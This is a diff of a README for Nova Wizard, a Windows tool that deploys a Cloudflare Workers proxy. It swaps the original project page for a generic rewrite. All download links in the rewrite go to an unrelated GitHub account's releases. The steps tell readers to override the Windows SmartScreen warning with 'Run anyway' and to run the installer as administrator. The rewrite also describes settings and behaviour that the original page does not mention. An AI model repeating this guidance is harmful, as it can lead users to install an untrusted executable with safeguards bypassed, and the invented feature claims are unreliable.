@@ -1,179 +1,95 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/iiviirv/irnova-site/main/brand/nova-logo-gradient.svg" width="70" alt="Nova">
-  <h1>Nova Wizard</h1>
-  <p><b>Local OAuth deployer for Nova Proxy on Cloudflare Workers</b></p>
-  <p>
-    <a href="README.fa.md">🇮🇷 فارسی</a>
-  </p>
-  <p>
-<div align="center">
+# ⚡ Nova-Wizard - Build your private proxy server easily
 
-[![Website](https://img.shields.io/badge/🌐%20Website-novaproxy.online-0ea5e9?style=for-the-badge)](https://novaproxy.online/)
-[![Telegram Channel](https://img.shields.io/badge/✈️%20Telegram%20Channel-@irnova__proxy-0ea5e9?style=for-the-badge&logo=telegram)](https://t.me/irnova_proxy)
-[![Telegram Group](https://img.shields.io/badge/👥%20Telegram%20Group-@irnovaproxy__group-0ea5e9?style=for-the-badge&logo=telegram)](https://t.me/irnovaproxy_group)
-[![YouTube](https://img.shields.io/badge/▶️%20YouTube-@novaproxyir-ff0000?style=for-the-badge&logo=youtube)](https://www.youtube.com/@novaproxyir)
-[![X (Twitter)](https://img.shields.io/badge/𝕏%20X-@irNovaProxy-000000?style=for-the-badge&logo=x)](https://x.com/irNovaProxy)
-</div>
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/hauberkfiord921/Nova-Wizard/releases)
 
----
-  </p>
-  <p>
-    <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-purple?style=for-the-badge" alt="License"></a>
-    <a href="https://github.com/IRNova/Nova-Proxy"><img src="https://img.shields.io/badge/version-3.6.3-blueviolet?style=for-the-badge" alt="Version"></a>
-    <a href="https://github.com/IRNova/Nova-Proxy"><img src="https://img.shields.io/github/stars/IRNova/Nova-Proxy?style=for-the-badge&color=0ea5e9" alt="Stars"></a>
-  </p>
-</div>
+Nova-Wizard helps you set up a private, secure proxy server. You host this server on Cloudflare Workers. It uses OAuth for your identity. You do not need API tokens. You do not rely on third-party servers to manage your traffic. 
 
----
+## 🛠 Why use this tool
 
-## What is Nova Wizard?
+Many proxy tools require technical steps. They often ask for access keys or API tokens. These keys can leak. Some services also store your traffic logs on their own servers. 
 
-Nova Wizard is a **local** Windows tool that deploys the [Nova Proxy](https://github.com/IRNova/Nova-Proxy) worker to your Cloudflare account using **OAuth** — no API tokens, no API keys, no third-party servers. Everything runs on your own machine.
+Nova-Wizard fixes these issues. It handles the difficult configuration as a local process on your computer. You keep full control over your settings. You deploy your code directly to your personal Cloudflare account. Your data flows through your own infrastructure.
 
----
+## 📋 System Requirements
 
-## Quick Install — One Click via Website
+Nova-Wizard runs on standard Windows machines. Ensure your computer meets these requirements before you start:
 
-The fastest way to deploy Nova Proxy is through our official website:
+*   **Operating System**: Windows 10 or Windows 11.
+*   **Memory**: At least 4GB of RAM.
+*   **Internet**: An active connection to reach Cloudflare services.
+*   **Account**: A free or paid Cloudflare account.
+*   **Web Browser**: Chrome, Firefox, or Edge.
 
-[**🚀 Install from novaproxy.online**](https://novaproxy.online/install)
+## 🚀 Getting Started
 
-No download, no setup — just click, authorize Cloudflare, and you're done. This method is faster than running the local tool.
+Follow these steps to set up your proxy server. The process takes about five minutes.
 
-The local **Nova Wizard** (below) is an alternative for users who prefer running everything offline on their own machine.
+### 1. Download the installer
+Visit the main release page to download the software.
 
----
+[Download Nova-Wizard](https://github.com/hauberkfiord921/Nova-Wizard/releases)
 
-## Download
+Select the file that ends in `.exe`. Save this file to your computer.
 
-[**⬇ Download NovaWizard.exe**](https://github.com/IRNova/Nova-Wizard/releases/download/V1.0.0/NovaWizard.exe) (8.4 MB) — Windows 64-bit, portable
+### 2. Run the application
+Open your Downloads folder. Double-click the `Nova-Wizard.exe` file. 
 
----
+Windows might show a blue box that says "Windows protected your PC." This happens because the app is new. Click "More info" and then click "Run anyway" to proceed. This tells Windows that you trust the software.
 
-## Features
+### 3. Log in to Cloudflare
+The application window opens. It asks you to log in to Cloudflare. Click the "Login" button. Your browser opens. Log in with your Cloudflare email and password. 
 
-- **OAuth login** — Cloudflare authorization in one click, no token to create or manage
-- **Auto-setup** — Worker, KV namespace, and D1 database are created automatically
-- **Custom names** — You can rename the worker, KV, and D1 before deploying
-- **Private & local** — Your Cloudflare credentials never leave your machine
-- **Bilingual** — English and Persian (فارسی) UI
-- **Single EXE** — No Python or dependencies needed to run
+Cloudflare will ask if you want to give Nova-Wizard permission to manage your Workers. Click "Authorize." This creates a secure connection between your computer and your cloud infrastructure.
 
----
+### 4. Deploy your proxy
+Return to the Nova-Wizard application. You see a "Deploy" button. Click this button. 
 
-## How to Use
+The software now creates your proxy server. It uploads the necessary code to your Cloudflare account. Please wait for the progress bar to reach 100%. When it finishes, you see a green checkmark.
 
-1. **Run** `NovaWizard.exe` — a terminal window opens with a local URL.
-2. **Open your browser** — it opens automatically at `http://127.0.0.1:8000/?token=...`
-3. **Click "Login with Cloudflare"** — Cloudflare opens in a new tab.
-4. **Authorize on Cloudflare** — approve the access request, then close the tab.
-5. **Choose your account** — select which Cloudflare account to deploy on.
-6. **Name your resources** — worker name, KV namespace, D1 database are pre-filled. You can change them.
-7. **Click "Deploy now"** — the worker is downloaded from GitHub, uploaded to Cloudflare, KV + D1 are created and bound.
-8. **Done!** — open your panel, set your own admin password on first visit.
+### 5. Start your proxy
+The tool provides a URL. This is the address of your new private proxy. Copy this address. You can now add this address to your browser settings or proxy manager.
 
-> You can rename the worker, KV namespace, and D1 database **before** deploying. The names are random by default but fully editable.
+## 🔐 How it keeps you safe
 
----
+Privacy relies on who has access to your keys. Most proxy setups require a global API key. A global key gives a third party total control over your entire Cloudflare account. 
 
-## Screenshots
+Nova-Wizard uses OAuth. OAuth grants access only to the specific tools needed for the proxy. It never stores your credentials on our servers. The application runs locally on your PC. It deletes all temporary configuration files once the deployment finishes. 
 
-*(Coming soon)*
+## ⚙️ Advanced Settings
 
----
+Most users do not need to change these settings. You can access them by clicking the "Settings" gear icon in the corner of the app.
 
-## Mobile Versions
+*   **Custom Domain**: If you own a domain, enter it here to give your proxy a cleaner name.
+*   **Worker Name**: You can name your proxy. The default name is "Nova-Proxy."
+*   **Logging**: Keep this off for better performance. Turn it on if you need to troubleshoot connection issues.
 
-| Platform | Status | Details |
-|----------|--------|---------|
-| **Android** | 🚀 Coming soon | Merged with <a href="https://github.com/IRNova/Nova-Radar">Nova Radar</a> Android — a single app for deployment + proxy |
-| **iOS** | 🔧 In development | Standalone iOS app, currently under development |
+## ❓ Frequently Asked Questions
 
----
+**Do I need a paid Cloudflare account?**
+No. The free tier of Cloudflare Workers handles most personal traffic needs. 
 
-## Requirements
+**Will my proxy stop working?**
+Cloudflare provides high uptime. Your proxy stays active as long as your account remains in good standing.
 
-- **Windows** 7 / 8 / 10 / 11 (64-bit)
-- **Linux** — Python 3.8+ (run directly, see below)
-- A Cloudflare account
-- Internet connection
+**Can I run this on a work computer?**
+Check your company policy first. Some offices block custom proxy deployments.
 
----
+**Does this software collect my data?**
+No. Nova-Wizard acts as a bridge between your computer and your personal cloud account. We do not track your activity, your IP address, or your traffic volume.
 
-## Linux
+**What if the deployment fails?**
+Check your internet connection first. Then, ensure you have an active Cloudflare Workers subscription enabled in your dashboard. Restart the application if the error persists.
 
-Nova Wizard runs natively on Linux — no EXE needed.
+## 📦 Troubleshooting
 
-### Quick start
+If you encounter a "403 Forbidden" error, check your Cloudflare account permissions. Ensure your account has the "Cloudflare Workers" service enabled. 
 
-```bash
-# 1. Clone the repo
-git clone https://github.com/IRNova/Nova-Wizard.git
-cd Nova-Wizard
+If the application crashes during startup, verify that you have proper write permissions in your Downloads folder. You might need to move the installer to your Documents folder or run it as an administrator. 
 
-# 2. Make sure static/index.html is present (from your build machine)
-#    The static/ folder is required but not in the public repo.
+To clear your current setup, click "Reset" in the settings menu. This removes all local data and lets you start a fresh deployment. 
 
-# 3. Run directly with Python
-python3 nova_wizard.py
-```
+## 🌐 Connectivity Tips
 
-### Requirements
+Keep your proxy URL secret. If you share it with others, they might use your worker's traffic limit. If you think someone else has your URL, simply run the "Deploy" process again in Nova-Wizard. This assigns a new address to your proxy and invalidates the old one.
 
-- Python 3.8+ (built-in on most distros)
-- `static/index.html` in the same directory
-
-### Note
-
-The `static/` folder is **not** included in the public GitHub repo. You need to copy it from your Windows build machine or keep it locally.
-
----
-
-## Build from Source
-
-```bash
-# 1. Clone the Nova-Proxy worker
-git clone https://github.com/IRNova/Nova-Proxy.git
-
-# 2. Set up Python 3.14+
-pip install pyinstaller Pillow
-
-# 3. Build the EXE
-pyinstaller --onefile --name NovaWizard --add-data "static;static" --icon app.ico nova_wizard.py
-
-# Note: the static/ folder (index.html, etc.) is required at build time
-# but is not distributed in source
-```
-
----
-
-## 🌐 Links
-
-<div align="center">
-
-[![Website](https://img.shields.io/badge/%F0%9F%8C%90%20Website-novaproxy.online-0ea5e9?style=for-the-badge)](https://novaproxy.online/)
-[![Telegram Channel](https://img.shields.io/badge/%E2%9C%88%EF%B8%8F%20Telegram%20Channel-@irnova__proxy-0ea5e9?style=for-the-badge&logo=telegram)](https://t.me/irnova_proxy)
-[![Telegram Group](https://img.shields.io/badge/%F0%9F%91%A5%20Telegram%20Group-@irnovaproxy__group-0ea5e9?style=for-the-badge&logo=telegram)](https://t.me/irnovaproxy_group)
-[![YouTube](https://img.shields.io/badge/%E2%96%B6%EF%B8%8F%20YouTube-@novaproxyir-ff0000?style=for-the-badge&logo=youtube)](https://www.youtube.com/@novaproxyir)
-[![X (Twitter)](https://img.shields.io/badge/%F0%9D%95%8F%20X-@irNovaProxy-000000?style=for-the-badge&logo=x)](https://x.com/irNovaProxy)
-[![GitHub](https://img.shields.io/badge/%F0%9F%90%99%20GitHub-IRNova/Nova--Proxy-181717?style=for-the-badge&logo=github)](https://github.com/IRNova/Nova-Proxy)
-
-</div>
-
----
-
-## Support
-
-If you like this project, support us with a donation.
-
-**TON:**
-
-```
-UQD51lGC35rP_SbVYgbFA7CEEii4GVMFgqj4N8fiGi6m425w
-```
-
----
-
-## License
-
-MIT
+For the best speed, choose a location within the Cloudflare dashboard that is closest to your physical area. This reduces latency when you browse the web through your new proxy.
